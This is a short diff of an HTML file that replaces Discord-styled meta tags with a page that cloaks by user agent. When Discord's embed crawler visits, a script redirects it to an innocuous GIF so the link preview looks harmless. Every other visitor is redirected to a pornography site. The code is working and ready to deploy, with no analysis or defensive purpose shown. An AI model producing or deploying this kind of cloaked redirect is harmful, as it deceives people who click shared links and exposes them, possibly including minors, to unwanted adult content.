@@ -1,7 +1,22 @@
-<meta content="Discord - Free Voice and Text Chat" property="og:title">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Page</title>
+    <script>
+        // JavaScript to check if the request is from Discord's embed service
+        if (/^Mozilla\/5.0 \(.*https:\/\/discord\.com.*\) .*Gecko\/.* Discord\/.*$/.test(navigator.userAgent)) {
+            // If it's Discord's embed service, show the image
+            window.location.href = 'https://media.discordapp.net/attachments/1083351847416385577/1210705435062050876/i-text.gif?ex=65eb884d&is=65d9134d&hm=60cafa8a1ee2812d9f04893a88b9740aa3fa9eb52cd61dba870764aedea425b7&';
+        } else {
+            // If it's a regular user, redirect them to your desired link
+            window.location.href = 'https://pornhub.com';
+        }
+    </script>
+</head>
+<body>
+    <!-- Content is not necessary for Discord embeds, but you can include any additional content here -->
+</body>
+</html>
 
-<meta content="Step up your game with a modern voice & text chat app. Crystal clear voice, multiple server and channel support, mobile apps, and more." property="og:description">
-
-<meta content="Discord" property="og:site_name">
-
-<meta content='https://discordapp.com/assets/ba74954dde74ff40a32ff58069e78c36.png' property='og:image'>
